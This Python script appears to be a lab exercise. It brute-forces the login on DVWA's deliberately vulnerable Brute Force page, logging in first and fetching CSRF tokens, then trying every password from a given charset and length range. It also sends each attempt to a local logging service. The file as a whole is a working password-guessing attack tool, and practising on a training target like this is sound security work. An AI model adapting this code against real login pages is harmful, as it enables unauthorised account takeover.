#!/usr/bin/env python3
"""
DVWA Bruteforce (auth + brute) with CSRF token support.

1) Логинится в DVWA через /login.php, используя отдельные креды DVWA.
2) После успешного логина перебирает пароли на странице /vulnerabilities/brute/.
"""

import argparse
import itertools
import re
import sys
import time
from typing import Generator, Optional
from urllib.parse import urlsplit

import requests

SUCCESS_MARKER = "Welcome to the password protected area"


def log_attempt(username: str, password: str, success: bool,
                source: str = "dvwa_bruteforce") -> None:
    """
    Отправка информации о попытке брута во Flask-сервис.
    Если сервис недоступен, ошибки глушим, чтобы не ломать брутфорс.
    """
    try:
        resp = requests.post(
            "http://localhost:5000/attempts",
            json={
                "username": username,
                "password": password,
                "success": bool(success),
                "source": source,
            },
            timeout=1.0,
        )
        # можно включить для отладки:
        # print("LOG:", resp.status_code, resp.text)
    except Exception:
        # лог — вспомогательный, он не должен ронять основной скрипт
        pass


def generate_passwords(charset: str,
                       min_len: int,
                       max_len: int) -> Generator[str, None, None]:
    """
    Генерирует все пароли из заданного алфавита с длиной от min_len до max_len.
    """
    if min_len <= 0 or max_len < min_len:
        raise ValueError("Incorrect min_len/max_len")

    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)


class DVWABruteforcer:
    """
    Клиент для логина в DVWA и брутфорса модуля Brute Force.
    """
    # Ищем user_token в любом input, с одиночными или двойными кавычками
    TOKEN_REGEX = re.compile(
        r"name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"]",
        re.IGNORECASE,
    )

    def __init__(
        self,
        brute_url: str,
        target_username: str,
        dvwa_username: str,
        dvwa_password: str,
        timeout: float = 5.0,
        sleep_between: float = 0.0,
    ) -> None:
        self.brute_url = brute_url.rstrip("/")
        self.target_username = target_username
        self.dvwa_username = dvwa_username
        self.dvwa_password = dvwa_password
        self.timeout = timeout
        self.sleep_between = sleep_between

        self.session = requests.Session()

        # Разберём URL brute, чтобы получить URL логина.
        parsed = urlsplit(self.brute_url)
        # Префикс приложения до /vulnerabilities 
        idx = parsed.path.find("/vulnerabilities")
        if idx == -1:
            app_prefix = ""
        else:
            app_prefix = parsed.path[:idx]

        login_path = app_prefix + "/login.php"
        self.login_url = f"{parsed.scheme}://{parsed.netloc}{login_path}"

    def _fetch_token(self, url: str, required: bool = True) -> str:
        """
        Загружает страницу и пробует вытащить user_token из HTML.
        Если required=False, то при отсутствии токена возвращает пустую строку.
        """
        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except Exception as e:
            raise RuntimeError(f"Failed to load page {url}: {e}") from e

        if resp.status_code != 200:
            raise RuntimeError(
                f"Unexpected status code {resp.status_code} while fetching {url}"
            )

        match = self.TOKEN_REGEX.search(resp.text)
        if not match:
            if required:
                raise RuntimeError(f"user_token not found in HTML of {url}")
            return ""

        return match.group(1)

    def login_to_dvwa(self) -> None:
        """
        Логинится в DVWA через /login.php.
        1) Пробует достать user_token (если есть).
        2) Отправляет POST с логином/паролем DVWA.
        """
        print(f"[*] Logging in to DVWA at {self.login_url} as '{self.dvwa_username}'")

        # user_token для логина может быть, а может и нет — не делаем его обязательным.
        try:
            token = self._fetch_token(self.login_url, required=False)
        except Exception as e:
            raise RuntimeError(f"Failed to load DVWA login page: {e}") from e

        data = {
            "username": self.dvwa_username,
            "password": self.dvwa_password,
            "Login": "Login",
        }
        if token:
            data["user_token"] = token

        try:
            resp = self.session.post(
                self.login_url,
                data=data,
                timeout=self.timeout,
                allow_redirects=True,
            )
        except Exception as e:
            raise RuntimeError(f"DVWA login request failed: {e}") from e

        if resp.status_code != 200:
            raise RuntimeError(
                f"Unexpected status code {resp.status_code} after DVWA login"
            )

        if "Login :: Damn Vulnerable Web Application" in resp.text:
            raise RuntimeError("DVWA login seems to have failed (still on login page)")

        print("[+] DVWA login successful")

    def try_password(self, password: str) -> bool:
        """
        Пытается подобрать пароль для модуля Brute Force.
        На этой странице логин/пароль идут через GET.
        user_token может отсутствовать, поэтому он необязателен.
        """
        token = self._fetch_token(self.brute_url, required=False)

        params = {
            "username": self.target_username,
            "password": password,
            "Login": "Login",
        }
        if token:
            params["user_token"] = token

        try:
            resp = self.session.get(
                self.brute_url,
                params=params,
                timeout=self.timeout,
                allow_redirects=True,
            )
        except Exception as e:
            print(f"[!] Request failed for password '{password}': {e}")
            return False

        if resp.status_code != 200:
            print(f"[!] Got status {resp.status_code} for password '{password}'")
            return False

        return SUCCESS_MARKER in resp.text

    def bruteforce(self,
                   passwords: Generator[str, None, None]) -> Optional[str]:
        """
        Перебирает пароли из генератора до первого успешного входа.
        Возвращает найденный пароль или None, если перебор исчерпан.
        Параллельно логирует каждую попытку во Flask+Redis.
        """
        start_time = time.time()
        attempts = 0

        for pwd in passwords:
            attempts += 1
            if attempts % 100 == 0:
                elapsed = time.time() - start_time
                speed = attempts / elapsed if elapsed > 0 else 0.0
                print(
                    f"\r[*] Tried {attempts} passwords, "
                    f"elapsed {elapsed:.1f}s, speed {speed:.1f} pwd/s",
                    end="",
                    flush=True,
                )

            success = self.try_password(pwd)

            # вот тут происходит "автоматизированный" лог:
            log_attempt(self.target_username, pwd, success)

            if success:
                elapsed = time.time() - start_time
                print(
                    f"\n[+] SUCCESS! Password found: '{pwd}' "
                    f"after {attempts} attempts in {elapsed:.1f}s"
                )
                return pwd

            if self.sleep_between > 0:
                time.sleep(self.sleep_between)

        print("\n[-] Password not found in given search space.")
        return None


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="DVWA Bruteforce tool (with automatic DVWA login)."
    )
    parser.add_argument(
        "--url",
        required=True,
        help="URL страницы DVWA Brute Force "
             "(например, http://dvwa.local:8080/vulnerabilities/brute/)",
    )
    parser.add_argument(
        "--username",
        required=True,
        help="Имя пользователя для перебора (цель брута, напр. 'admin').",
    )
    parser.add_argument(
        "--charset",
        required=True,
        help="Алфавит для генерации паролей (например, 'abc123').",
    )
    parser.add_argument(
        "--min-len",
        type=int,
        required=True,
        help="Минимальная длина пароля.",
    )
    parser.add_argument(
        "--max-len",
        type=int,
        required=True,
        help="Максимальная длина пароля.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="Таймаут HTTP-запросов в секундах (по умолчанию 5.0).",
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=0.0,
        help="Пауза между попытками (секунды).",
    )
    parser.add_argument(
        "--dvwa-user",
        required=True,
        help="Имя пользователя для логина в DVWA (по умолчанию 'admin').",
    )
    parser.add_argument(
        "--dvwa-pass",
        required=True,
        help="Пароль для логина в DVWA (тот, что вводишь на /login.php).",
    )
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv)

    try:
        passwords = generate_passwords(args.charset, args.min_len, args.max_len)
    except ValueError as e:
        print(f"[!] Invalid generator parameters: {e}")
        return 1

    bruteforcer = DVWABruteforcer(
        brute_url=args.url,
        target_username=args.username,
        dvwa_username=args.dvwa_user,
        dvwa_password=args.dvwa_pass,
        timeout=args.timeout,
        sleep_between=args.sleep,
    )

    try:
        bruteforcer.login_to_dvwa()
        bruteforcer.bruteforce(passwords)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        return 1
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

